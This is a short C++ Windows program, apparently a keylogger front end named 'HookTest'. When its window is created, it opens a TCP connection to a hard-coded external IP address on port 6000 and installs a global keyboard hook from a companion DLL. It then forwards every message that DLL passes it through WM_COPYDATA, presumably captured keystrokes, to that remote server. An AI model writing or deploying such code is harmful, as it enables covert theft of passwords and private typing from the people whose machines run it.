#include <windows.h>
#include "HookDll.h"
#include "resource.h"
#include "CTcpClient.h"
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#pragma comment(lib, "HookDll.lib")
static TCHAR szWindowClass[] = _T("DesktopApp");
static TCHAR szTitle[] = _T("HookTest");
HINSTANCE hInst;
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
CTcpClient Client("121.40.68.220",6000);
int WINAPI WinMain(_In_ HINSTANCE hInstance,_In_opt_ HINSTANCE hPrevInstance,_In_ LPSTR  lpCmdLine,_In_ int       nCmdShow
)
{
    WNDCLASSEX wcex;
    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(wcex.hInstance, IDI_APPLICATION);
    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = NULL;
    wcex.lpszClassName = szWindowClass;
    wcex.hIconSm = LoadIcon(wcex.hInstance, IDI_APPLICATION);

    if (!RegisterClassEx(&wcex))
    {
        MessageBox(NULL,_T("Call to RegisterClassEx failed!"), _T("Windows Desktop Guided Tour"),NULL);
        return 1;
    }
    hInst = hInstance;
    HWND hWnd = CreateWindowExW(WS_EX_OVERLAPPEDWINDOW,szWindowClass,szTitle,WS_OVERLAPPEDWINDOW,CW_USEDEFAULT, CW_USEDEFAULT,500, 100,NULL,
        NULL,hInstance,NULL
    );
    UpdateWindow(hWnd);
    if (!hWnd)
    {
        MessageBox(NULL,_T("Call to CreateWindow failed!"),_T("Windows Desktop Guided Tour"),NULL);
        return 1;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:
        Client.InitConnect();
        InstallHook(WH_KEYBOARD, 0, hWnd);
        break;
    case WM_PAINT:
        break;
    case WM_DESTROY:
        UninstallHook();
        PostQuitMessage(0);
        break;
    case WM_COPYDATA:
        Client.SendMsg((char*)((PCOPYDATASTRUCT)lParam)->lpData);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
        break;
    }
    return 0;
}
